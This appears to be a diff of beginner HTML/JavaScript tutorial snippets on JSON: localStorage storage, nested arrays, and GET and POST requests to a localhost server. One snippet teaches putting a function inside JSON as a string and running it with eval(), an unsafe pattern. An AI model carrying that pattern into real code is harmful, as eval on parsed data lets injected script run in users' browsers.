+
+
+
+
+
+
+<br>Retrieving Data from The Local storage
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+
+
+<body>
+  <p id="imxx"> </p>
+  <script>
+imran={"Name":"imran", "class":12, "Age":25, "haircolor":"Brown"}
+var imran2=JSON.stringify(imran);
+localStorage.setItem("myJson",imran2);
+
+
+
+text=localStorage.getItem("myJson");
+text2=JSON.parse(text);
+document.getElementById("imxx").innerHTML=text2.Name;
+  </script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br>Json Arrays Inside arrays
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+imran={
+  "name":"irman",
+  "Age":21,
+  "class":"B Tech",
+  "Passion":"Hacking",
+  "cars":[
+  {"Name":"Farari", "models":["one","two","three"]},
+  {"Name":"bugati", "models":["one","two","three"]},
+  {"Name":"Flat", "models":["one","two","three"]}
+]
+}
+//alerts the cars names
+for (x in imran.cars)
+{
+alert(imran.cars[x].Name);
+}
+
+
+
+//alerts the cars models names
+for (x in imran.cars)
+{
+  for(j in imran.cars[x].models)
+  {
+alert(imran.cars[x].models[j]);
+}
+}
+</script>
+
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+<br>Receaving an Parsing Data online using Json
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+  <p id="imxx"> c</p>
+<script>
+function imran()
+{
+  var xhttp=new XMLHttpRequest();
+  xhttp.onreadystatechange=function()
+  {
+var myobject=JSON.parse(xhttp.responseText);
+document.getElementById("imxx").innerHTML=myobject.name;
+  }
+
+  xhttp.open("GET","http://127.0.0.1/json_demo.txt",true);
+  xhttp.send();
+}
+</script>
+<input type="button" value="Click ME" onmouseout="imran()" />
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.<br>Functions is Json Data
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+  <p id="imxx">hello</p>
+<script>
+imran='{"name":"imran", "age":"function(){return 100;}", "color":"brown"}';
+var myob=JSON.parse(imran);
+myob.age=eval("("+myob.age+")");
+document.getElementById("imxx").innerHTML=myob.age();
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.<br>Sending Javascript objects as Json data and saving it to the Server
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+  <script>
+imran={
+  "name":"imran",
+  "haircolor":"brown",
+  "age":20
+}
+var myjson=JSON.stringify(imran);
+
+function imxx()
+{
+  var imxx2=new XMLHttpRequest();
+  imxx2.onreadystatechange=function()
+  {
+  }
+  imxx2.open("POST","http://127.0.0.1/dump-requests-post/dumprequest.php",true);
+  imxx2.send(myjson);
+}
+
+</script>
+<input type="button" value="CLick Me" onmouseout="imxx()" />
+</body>
+</html>
